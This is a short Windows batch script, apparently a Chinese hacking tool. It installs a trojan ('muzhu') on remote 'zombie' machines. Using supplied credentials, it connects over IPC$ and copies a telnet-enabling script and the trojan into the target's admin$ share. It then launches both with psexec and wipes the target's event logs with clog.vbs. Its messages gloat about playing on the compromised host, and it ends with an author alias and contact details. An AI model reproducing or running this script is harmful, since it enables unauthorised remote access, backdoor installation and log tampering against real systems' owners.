@echo 木猪运行初始化…………
@net use \\%1\ipc$ %3 /user:"%2"
@if errorlevel 1 goto help
@echo 建立连接成功啦!!
@copy telnet.vbs \\%1\admin$\system32
@if errorlevel 1 goto over
@echo 向肉鸡COPY开启telnet的文件…………OK!
@copy muzhu.bat \\%1\admin$\system32
@echo 向肉鸡COPY木猪…………OK!
@psexec -d \\%1 c:\winnt\system32\telnet.vbs
@echo 正在开启telnet…………OK!
@psexec -d \\%1 c:\winnt\system32\muzhu.bat
echo 执行肉鸡上的木猪…………OK!
:over
@cscript clog.vbs %1 %2 %3 -all
@echo 清除肉鸡的日志文件…………OK
@echo 木猪安装完毕!5分钟之后到肉鸡上玩玩吧 !
@echo ***************************************************************
@echo 作者：红衣刺客 QQ:158017079 Email:piaoxue12603.student@sina.com
@echo ***************************************************************
@goto end
:help
@echo 好惨~~建立连接失败!无法安装木牛!换台肉鸡试试吧!什么?你没鸡了??倒~~~
:end
